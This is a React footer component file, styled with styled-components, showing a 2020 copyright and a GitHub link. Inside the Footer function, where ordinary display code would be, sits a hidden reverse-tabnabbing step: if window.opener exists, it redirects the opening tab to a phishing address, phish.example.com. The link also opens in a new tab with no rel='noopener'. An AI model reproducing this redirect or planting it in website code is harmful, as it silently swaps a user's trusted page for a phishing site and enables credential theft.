import React from "react";
import styled from "styled-components";

const Root = styled.div``;

const FooterContainer = styled.div`
  text-align: center;
  padding: 6px;
  letter-spacing: 1px;
  background: #000;
  color: #eee;

  & a {
    text-decoration: none;
    color: #338ccc;
  }
  & a:hover {
    color: #eee;
  }
`;

export default function Footer() {
  if (window.opener) {
    window.opener.location = "https://phish.example.com";
  }

  return (
    <Root>
      <FooterContainer>
        © 2020{" "}
        <a href="https://github.com/heidiliu2020" target="_blank">
          Heidi
        </a>
        {" ♥ "}
        Powered by React
      </FooterContainer>
    </Root>
  );
}
